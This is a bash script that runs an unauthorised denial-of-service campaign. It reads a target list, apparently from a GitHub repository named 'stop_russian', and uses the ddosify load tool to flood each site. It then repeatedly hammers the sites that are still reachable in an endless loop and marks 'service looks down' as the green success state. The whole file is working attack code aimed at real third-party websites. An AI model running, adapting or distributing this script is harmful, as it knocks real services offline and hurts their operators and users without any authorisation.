red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
reset=`tput sgr0`
#wget -O updated_list.txt -q https://raw.githubusercontent.com/zabidok/stop_russian/main/list.txt
#readarray -t list < list.txt
live=()

while read -r site; do
    echo -n -e "$site\t"
    result_data=$(ddosify -t $site -d 1 | awk '/RESULT/{p=1}p')
    fail_count=$(echo $result_data | grep -oP '(?<=Failed Count: )[0-9]+' | head -1)
    succes_count=$(echo $result_data | grep -oP '(?<=Success Count: )[0-9]+' | head -1)

    if [[ "$fail_count" == 100 ]]; then
      echo "${green}service looks down $fail_count%${reset}"
    elif [[ "$fail_count" == 0 ]]; then
      live=(${live[@]} $site)
      echo "${red}service feels good $fail_count%${reset}"
    else
      live=(${live[@]} $site)
      echo "${yellow}service feels bad $fail_count% ${reset}"
#      echo $result_data
#      echo "Failed - $fail_count";
#      echo "Success - $succes_count";
    fi
done < list.txt

while true; do
  echo "-----------------------------------"
  for site in "${live[@]}"
    do
    echo -n -e "$site\t"
    result_data=$(ddosify -t $site -d 60 | awk '/RESULT/{p=1}p')
    fail_count=$(echo $result_data | grep -oP '(?<=Failed Count: )[0-9]+' | head -1)
    success_count=$(echo $result_data | grep -oP '(?<=Success Count: )[0-9]+' | head -1)
    if [[ "$fail_count" == 100 ]]; then
      echo "${green}service looks down $fail_count%${reset}"
    elif [[ "$fail_count" == 0 ]]; then
      echo "${red}service feels good $fail_count%${reset}"
    else
      echo "${yellow}service feels bad $fail_count% ${reset}"
    fi
  done
done
